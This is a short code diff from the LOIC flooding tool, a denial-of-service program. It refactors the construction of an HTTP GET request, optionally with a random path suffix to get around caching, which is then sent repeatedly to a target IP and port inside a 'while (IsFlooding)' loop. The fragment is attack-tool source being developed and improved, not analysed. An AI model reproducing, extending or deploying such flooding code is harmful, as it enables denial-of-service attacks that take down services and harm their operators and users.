@@ -66,15 +66,17 @@ namespace LOIC
 		{
 			try
 			{
-				byte[] buf;
+			    string randomString;
 				if (random)
 				{
-					buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, Functions.RandomString(), Environment.NewLine, Host));
+				    randomString = Functions.RandomString();
 				}
 				else
 				{
-					buf = Encoding.ASCII.GetBytes(String.Format("GET {0} HTTP/1.1{1}Host: {2}{1}{1}{1}", Subsite, Environment.NewLine, Host));
+				    randomString = string.Empty;
 				}
+                string bufferContents = String.Format("GET {0}{1} HTTP/1.1{2}Host: {3}{2}{2}{2}", Subsite, randomString, Environment.NewLine, Host);
+                byte[] buf = Encoding.ASCII.GetBytes(bufferContents);
 				var RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
